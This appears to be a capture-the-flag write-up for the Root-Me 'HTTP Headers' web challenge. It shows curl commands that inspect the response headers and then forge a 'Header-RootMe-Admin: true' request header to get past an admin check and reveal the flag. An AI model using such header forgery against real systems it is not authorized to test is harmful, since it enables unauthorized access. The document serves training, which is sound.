Well, the title is a great hint. We will have to look at headers. Some browser extensions allow you to look at extension.

But as you can see since the beginning of the solutions, I am a curl lover. Thus being said, type:

```
curl -v http://challenge01.root-me.org/web-serveur/ch5/
```

You can see the following response:

```
* Connected to challenge01.root-me.org (2001:bc8:35b0:c166::151) port 80 (#0)
> GET /web-serveur/ch5/ HTTP/1.1
> Host: challenge01.root-me.org
> User-Agent: curl/7.58.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx
< Date: Fri, 11 Jan 2019 17:14:34 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Vary: Accept-Encoding
< Header-RootMe-Admin: none
<
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
</body>
</html>
```

This ```
Header-RootMe-Admin: none
```
 is not something usual. Let's try setting it to true ?

 ```
 curl -v -H "Header-RootMe-Admin:true" http://challenge01.root-me.org/web-serveur/ch5/
 ```

You receive :

```
<p>You dit it ! You can validate the challenge with the password FLAG</p></body>
```

Congratz !
